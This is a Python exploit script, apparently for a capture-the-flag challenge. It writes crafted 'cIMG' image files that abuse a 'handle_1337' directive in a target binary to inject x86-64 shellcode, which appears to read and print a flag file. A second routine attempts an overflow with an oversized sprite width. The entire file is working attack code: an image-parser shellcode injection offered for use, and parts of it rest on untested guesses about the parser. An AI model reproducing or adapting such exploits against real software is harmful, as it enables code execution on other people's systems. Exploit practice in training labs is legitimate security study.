#!/usr/bin/env python3

import struct
from pwn import *


def create_malicious_cimg():
    """Create a malicious CIMG file that injects shellcode via handle_1337"""
    
    # CIMG header
    cimg_data = b"cIMG"  # Magic
    cimg_data += struct.pack("<H", 4)  # Version 4
    cimg_data += struct.pack("<BB", 8, 8)  # Width=8, Height=8 (small framebuffer)
    
    # Our shellcode (50 bytes)
    shellcode = bytes([
        0xbb, 0x66, 0x6c, 0x61, 0x67, 0x48, 0xc1, 0xe3, 
        0x08, 0xb3, 0x2f, 0x53, 0xb0, 0x02, 0x48, 0x89,
        0xe7, 0x48, 0x31, 0xf6, 0x0f, 0x05, 0x48, 0x31, 
        0xff, 0x48, 0xff, 0xc7, 0x48, 0x89, 0xc6, 0x48,
        0x31, 0xd2, 0x4d, 0x31, 0xd2, 0x66, 0x41, 0xba, 
        0xe8, 0x03, 0xb0, 0x28, 0x0f, 0x05, 0xb0, 0x3c,
        0x0f, 0x05
    ])
    
    # Directive 1: Initialize framebuffer with shellcode
    # We'll fill the framebuffer with our shellcode bytes as RGBA pixels
    cimg_data += struct.pack("<H", 1)  # Directive code 1
    
    # Create 64 pixels (8x8) with our shellcode bytes + padding
    pixel_data = b""
    for i in range(64):
        if i < len(shellcode):
            # Use shellcode byte as the alpha channel (most likely to be preserved)
            pixel_data += struct.pack("<BBBB", 0x41, 0x41, 0x41, shellcode[i])
        else:
            # Padding pixels
            pixel_data += struct.pack("<BBBB", 0x41, 0x41, 0x41, 0x90)  # NOP padding
    
    cimg_data += pixel_data
    
    # Directive 3: Allocate a sprite buffer at slot 0
    cimg_data += struct.pack("<H", 3)  # Directive code 3
    cimg_data += struct.pack("<BBB", 0, 8, 8)  # sprite_id=0, width=8, height=8
    cimg_data += b"A" * 64  # Dummy sprite data (will be overwritten)
    
    # Directive 1337: Extract shellcode from framebuffer into executable sprite
    cimg_data += struct.pack("<H", 0x539)  # Directive code 1337
    cimg_data += struct.pack("<BBBBB", 
        0,    # sprite_id = 0 (overwrite sprite slot 0)
        0,    # offset_x = 0
        0,    # offset_y = 0  
        8,    # width = 8 (extract 8 pixels wide)
        7     # height = 7 (extract 56 pixels = enough for our shellcode)
    )
    
    # End with directive 0 to terminate and trigger execution
    cimg_data += struct.pack("<H", 0)  # End
    
    return cimg_data

def create_simple_exploit():
    """Create a simple exploit that directly injects shellcode"""
    
    # Our shellcode (50 bytes)
    shellcode = bytes([
        0xbb, 0x66, 0x6c, 0x61, 0x67, 0x48, 0xc1, 0xe3, 
        0x08, 0xb3, 0x2f, 0x53, 0xb0, 0x02, 0x48, 0x89,
        0xe7, 0x48, 0x31, 0xf6, 0x0f, 0x05, 0x48, 0x31, 
        0xff, 0x48, 0xff, 0xc7, 0x48, 0x89, 0xc6, 0x48,
        0x31, 0xd2, 0x4d, 0x31, 0xd2, 0x66, 0x41, 0xba, 
        0xe8, 0x03, 0xb0, 0x28, 0x0f, 0x05, 0xb0, 0x3c,
        0x0f, 0x05
    ])
    
    # Basic CIMG header
    cimg_data = b"cIMG"  # Magic
    cimg_data += struct.pack("<H", 4)  # Version 4
    cimg_data += struct.pack("<BB", 8, 8)  # Width=8, Height=8
    
    # Try to use handle_1337 to create a buffer overflow
    cimg_data += struct.pack("<H", 0x539)  # Directive code 1337
    cimg_data += struct.pack("<BBBBB", 
        0,    # sprite_id = 0
        0,    # offset_x = 0
        0,    # offset_y = 0  
        50,   # width = 50 (larger than framebuffer to trigger overflow)
        1     # height = 1
    )
    
    # End
    cimg_data += struct.pack("<H", 0)
    
    return cimg_data

def main():
    print("[*] Creating malicious CIMG file...")
    malicious_cimg = create_malicious_cimg()
    
    with open("malicious.cimg", "wb") as f:
        f.write(malicious_cimg)
    
    print(f"[*] Created malicious.cimg ({len(malicious_cimg)} bytes)")
    print("[*] To exploit: ./challenge/integration-cimg-screenshot-sc malicious.cimg")
    
    # Also create a simple trigger version
    print("\n[*] Creating simple shellcode injection...")
    simple_data = create_simple_exploit()
    
    with open("simple.cimg", "wb") as f:
        f.write(simple_data)
    
    print(f"[*] Created simple.cimg ({len(simple_data)} bytes)")

if __name__ == "__main__":
    main()
